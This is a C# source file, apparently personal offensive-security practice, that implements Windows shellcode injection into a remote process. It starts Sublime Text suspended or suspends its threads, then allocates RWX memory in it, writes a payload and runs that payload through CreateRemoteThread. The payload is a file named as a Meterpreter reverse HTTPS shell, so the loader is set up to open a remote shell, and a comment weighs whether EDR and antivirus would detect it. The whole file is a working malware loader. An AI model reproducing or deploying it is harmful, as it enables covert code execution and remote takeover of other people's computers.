using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ThreadSuspendedRemoteProcessInjection
{
    internal class Program
    {
    	/* This way of process injection HIDES THE WINDOW OF THE TARGET PROCESS! */
    
        // http://pinvoke.net/default.aspx/kernel32/CreateProcess.html
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,  // use `string` for string pointers
            string lpCommandLine,
            // PASS THE STRUCTS AS REFERENCES WITH `ref`
            ref SECURITY_ATTRIBUTES lpProcessAttributes,  
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string? lpCurrentDirectory,  // use `string?` to allow `null` for opt. arg
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);
        // https://www.pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;  // USE `IntPtr` INSTEAD OF `byte*` TO NOT NECESSITATE `unsafe`!
            public int bInheritHandle;
        }
        // https://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]  // BE CONSISTENT! USE SAME `CharSet` AS RELATED FUNC.
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        // http://pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openthread
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(
            uint dwDesiredAccess, 
            bool bInheritHandle, 
            uint dwThreadId);

        //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-suspendthread
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);

        //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-resumethread
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            uint dwDesiredAcess,
            bool bInheritHandle,
            uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,  // LPVOID == IntPtr
            uint dwSize,  // size_t == int
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,  // 0 for default
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,  // 0 to make thread run immediately after creation
            IntPtr lpThreadId);  // for IntPtr that accepts NULL, use IntPtr.Zero !

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        /********** constants **********/

        // process constants
        public const int PROCESS_CREATE_THREAD = 0x0002;
        public const int PROCESS_QUERY_INFORMATION = 0x0400;
        public const int PROCESS_VM_OPERATION = 0x0008;
        public const int PROCESS_VM_WRITE = 0x0020;
        public const int PROCESS_VM_READ = 0x0010;

        // memory protection constants
        public const int MEM_COMMIT = 0x00001000;
        public const int MEM_RESERVE = 0x00002000;
        public const int PAGE_READWRITE = 0x04;
        public const int PAGE_EXECUTE_READ = 0x20;
        public const int PAGE_EXECUTE_READWRITE = 0x40;

        // thread access rights constants
        private static uint SUSPEND_RESUME = 0x0002;

        // process creation flags
        public const uint CREATE_SUSPENDED = 0x00000004; // this is also used by CreateThread!
        
        /*******************************/
        
        static void Main(string[] args)
        {
            // string processExePath = "C:\\Windows\\System32\\notepad.exe";
            string processExePath = "C:\\Program Files\\Sublime Text\\sublime_text.exe";
            TestCreateSuspendedProcessThenInject(processExePath);  // uses `CreateProcess`
            //TestInjectIntoExistingProcessThenSuspend(processExePath);  // uses `Process.Start`
        }

        public static void TestInjectIntoExistingProcessThenSuspend(string processExePath)
        {
            //byte[] payload = File.ReadAllBytes("C:\\Users\\proha\\OneDrive\\Desktop\\payloads\\windows_x64_exec_notepad.bin");
            byte[] payload = File.ReadAllBytes("C:\\Users\\proha\\OneDrive\\Desktop\\payloads\\windows_x64_meterpreter_slash_reverse_https_106_4443.bin");
            // spawn a process normally (this works with opening an existing proc too)
            Process targetProc = Process.Start(processExePath);
            // suspend all threads of the target proc
            foreach (ProcessThread thread in targetProc.Threads)
            {
                IntPtr hThread = OpenThread(SUSPEND_RESUME, false, (uint)thread.Id);
                if (hThread == IntPtr.Zero)
                    //break; // why break instead of cont. ?
                    continue;
                SuspendThread(hThread);
            }
            // inject the shellcode into target proc
            InjectShellcodeIntoProcessRWX(payload, targetProc.Id, 0);
        }

        // uses ``
        public static void TestCreateSuspendedProcessThenInject(string processExePath)
        {
            //byte[] payload = File.ReadAllBytes("C:\\Users\\proha\\OneDrive\\Desktop\\payloads\\windows_x64_exec_notepad.bin");
            byte[] payload = File.ReadAllBytes("C:\\Users\\proha\\OneDrive\\Desktop\\payloads\\windows_x64_meterpreter_slash_reverse_https_106_4443.bin");
            // initialize the structs that CreateProcess needs to run
            PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
            STARTUPINFO startupInfo = new STARTUPINFO();
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
            startupInfo.dwFlags = 0;
            // spawn a process in a SUSPENDED STATE
            CreateProcess(
                processExePath,
                null,
                // THERE IS NO WAY TO PASS `null` INTO
                // OPTIONAL PARAMETER EXPECTING STRUCT PTR FROM C#
                ref securityAttributes,
                ref securityAttributes,
                true,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref startupInfo,
                out processInformation);
            // inject the shellcode into it with a remote thread that RUNS IMMEDIATELY
            InjectShellcodeIntoProcessRWX(payload, processInformation.dwProcessId, 0);
        }

        public static void InjectShellcodeIntoProcessRWX(byte[] payload, int processId, uint dwCreationFlags)
        {
            /*
             * Assigns RWX mem from the getgo with VirtualAllocEx .
             * This will likely get caught by EDR's and AV's (?) !
             */

            IntPtr hTargetProc = OpenProcess(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                false,
                (uint)processId);

            IntPtr pTargetMemAddr = VirtualAllocEx(
                hTargetProc,
                IntPtr.Zero,
                (uint)payload.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            UIntPtr __numBytesWritten;
            WriteProcessMemory(
                hTargetProc,
                pTargetMemAddr,
                payload,
                (uint)payload.Length,
                out __numBytesWritten);

            CreateRemoteThread(
                hTargetProc,
                IntPtr.Zero,
                0,
                pTargetMemAddr,
                IntPtr.Zero,
                dwCreationFlags,
                IntPtr.Zero);

            CloseHandle(hTargetProc);
        }
    }
}
